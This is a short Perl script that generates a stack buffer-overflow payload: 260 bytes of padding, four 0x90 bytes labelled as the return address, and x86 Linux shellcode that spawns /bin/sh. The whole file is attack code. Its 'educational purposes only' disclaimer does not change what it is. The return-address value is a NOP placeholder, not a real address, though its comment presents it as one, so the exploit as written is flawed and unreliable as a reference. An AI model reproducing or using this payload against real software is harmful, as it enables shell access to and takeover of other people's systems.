#!/usr/bin/perl
# Created August 21st, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据

$padding = "A" x 260; # Fill the buffer and reach the return address
$new_return_address = "\x90\x90\x90\x90"; # Address where the shellcode will be placed (NOP sled)
$shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"; # Example shellcode to spawn a shell
$payload = $padding . $new_return_address . $shellcode;
print $payload;

# DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
